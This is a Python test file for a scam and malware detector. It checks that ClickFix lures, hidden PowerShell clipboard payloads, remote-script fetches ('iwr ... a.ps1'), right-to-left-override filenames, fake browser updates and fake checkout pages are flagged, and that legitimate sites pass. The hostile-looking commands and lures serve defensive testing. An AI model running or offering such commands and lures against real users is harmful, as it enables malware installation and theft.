import unittest

from signals import ScreenContext, analyze


class ControlTests(unittest.TestCase):
    def assert_clean(self, ctx: ScreenContext) -> None:
        result = analyze(ctx)
        self.assertEqual("SAFE", result["verdict"], result)
        self.assertEqual(0, result["finding_count"], result)

    def test_real_marketing_email_tracking_links_are_clean(self) -> None:
        self.assert_clean(ScreenContext(
            text="Your PayPal receipt and Amazon order confirmation.",
            links=[
                ("paypal.com", "https://epl.paypal-communication.com/click/receipt"),
                ("amazon.com", "https://awstrack.me/L0/order"),
            ],
            from_display="PayPal",
            from_address="service@paypal.com",
        ))

    def test_modern_bank_domain_is_clean(self) -> None:
        self.assert_clean(ScreenContext(page_url="https://modern-bank.com/account"))



# TRACK-C-WINDOWS
class TrackCWindowsTests(unittest.TestCase):
    def codes(self, ctx): return {f["code"] for f in analyze(ctx)["findings"]}
    def test_every_code(self):
        cases={
        "CLICKFIX_COMMAND":ScreenContext(text="Verify you are human: Win+R then paste"),
        "CLIPBOARD_PAYLOAD":ScreenContext(clipboard_text="powershell -w hidden -enc AAAA"),
        "MOTW_STRIPPED":ScreenContext(text="Zone.Identifier: missing",download_filename="a.exe"),
        "LNK_IN_ARCHIVE":ScreenContext(text="entry Invoice.lnk",download_filename="a.zip"),
        "SOFTWARE_IMPERSONATION":ScreenContext(text="Download VLC",page_url="https://evil.test",download_filename="vlc.exe"),
        "DOWNLOAD_HOST_MISMATCH":ScreenContext(download_host_url="https://evil.example.com/a.exe",download_referrer_url="https://vendor.example.org",download_filename="a.exe"),
        "DOUBLE_EXTENSION":ScreenContext(download_filename="invoice.pdf.exe"),
        "DOWNLOAD_TYPE_MISMATCH":ScreenContext(download_button_text="invoice PDF",download_filename="a.exe"),
        "FAKE_BROWSER_UPDATE":ScreenContext(text="Download Chrome browser update",page_url="https://evil.test"),
        "DISABLE_ANTIVIRUS":ScreenContext(text="Disable Windows Defender"),
        "TECH_SUPPORT_SCARE":ScreenContext(text="Your computer is infected. Don't shut down"),
        "PASSWORD_PROTECTED_ARCHIVE":ScreenContext(text="Password: danger123",download_filename="a.zip"),
        "WAREZ_CRACK":ScreenContext(text="pre-activated full version"),
        "MOTW_EVASION_CONTAINER":ScreenContext(text="invoice document",download_filename="a.iso"),
        "DANGEROUS_EXT":ScreenContext(text="Zone.Identifier: missing",download_filename="setup.exe")}
        cases["DOUBLE_EXTENSION_RTLO"]=ScreenContext(download_filename="invoice\u202efdp.exe")
        for label,ctx in cases.items():
            with self.subTest(label): self.assertIn("DOUBLE_EXTENSION" if label.endswith("RTLO") else label,self.codes(ctx))
    def test_controls(self):
        self.assertEqual("SAFE",analyze(ScreenContext(text="ETH uses proof of stake"))["verdict"])
        official=analyze(ScreenContext(text="Download Python",page_url="https://python.org",download_filename="python.exe")); self.assertEqual("SAFE",official["verdict"]); self.assertEqual(0,official["finding_count"])
        self.assertNotIn("CLICKFIX_COMMAND",self.codes(ScreenContext(text="Open Terminal and paste")))
        self.assertNotIn("MOTW_STRIPPED",self.codes(ScreenContext(download_filename="a.exe")))
        self.assertNotIn("LNK_IN_ARCHIVE",self.codes(ScreenContext(text="shortcut",download_filename="a.zip")))
        self.assertEqual(0, analyze(ScreenContext(text="Download VLC", page_url="https://github.com/videolan/vlc/releases", download_filename="vlc.exe"))["finding_count"])
    def test_bare_iwr_is_medium(self):
        r=analyze(ScreenContext(clipboard_text="iwr https://example.test/a.ps1")); f=next(x for x in r["findings"] if x["code"]=="CLIPBOARD_PAYLOAD"); self.assertEqual(2,f["severity"]); self.assertNotEqual("DANGER",r["verdict"])
    def test_original_regressions(self):
        self.assertEqual("DANGER",analyze(ScreenContext(links=[("paypal.com","https://evil.test")]))["verdict"])
        self.assertIn("FAKE_PAYMENT_PROCESSOR",self.codes(ScreenContext(text="Powered by Stripe Card number CVV",page_url="https://evil.test")))
        self.assertIn("SEED_PHRASE_REQUEST",self.codes(ScreenContext(text="Enter your 12-word recovery phrase")))
        self.assertNotIn("FAKE_PAYMENT_PROCESSOR",self.codes(ScreenContext(text="Powered by Stripe Card number CVV",page_url="https://merchant.test",iframe_origins=["https://js.stripe.com"])))

    def test_stripe_requires_observed_origin_evidence(self):
        uia_only = ScreenContext(
            text="Powered by Stripe Card number CVV",
            page_url="https://merchant.test",
            observed_fields={"text", "page_url"},
        )
        result = analyze(uia_only)
        codes = {finding["code"] for finding in result["findings"]}
        self.assertNotIn("FAKE_PAYMENT_PROCESSOR", codes)
        self.assertIn("PAYMENT_ORIGIN_UNVERIFIED", codes)
        self.assertEqual("CAUTION", result["verdict"])

    def test_hosted_stripe_checkout_is_not_treated_as_clone(self):
        hosted = ScreenContext(
            text="Powered by Stripe Card number CVV",
            page_url="https://checkout.stripe.com/c/pay/test",
        )
        self.assertEqual("SAFE", analyze(hosted)["verdict"])

    def test_legitimate_checkout_payment_methods_are_not_merchant_impersonation(self):
        checkout = ScreenContext(
            text="Express checkout Apple Pay PayPal Card number CVC",
            page_url="https://www.logitechg.com/en-us/checkout",
            iframe_origins=["https://js.stripe.com"],
            observed_fields={"text", "page_url", "iframe_origins"},
        )
        self.assertEqual("SAFE", analyze(checkout)["verdict"])

    def test_loopback_checkout_demo_preserves_safe_and_fake_controls(self):
        safe = ScreenContext(
            text="Powered by Stripe Card number CVC",
            page_url="http://127.0.0.1:8080/safe-checkout.html",
            iframe_origins=["https://js.stripe.com"],
            observed_fields={"text", "page_url", "iframe_origins"},
        )
        fake = ScreenContext(
            text="Powered by Stripe Card number CVV",
            page_url="http://127.0.0.1:8080/fake-checkout.html",
            iframe_origins=[],
            observed_fields={"text", "page_url", "iframe_origins"},
        )
        self.assertEqual("SAFE", analyze(safe)["verdict"])
        self.assertIn("FAKE_PAYMENT_PROCESSOR", self.codes(fake))


if __name__ == "__main__":
    unittest.main()
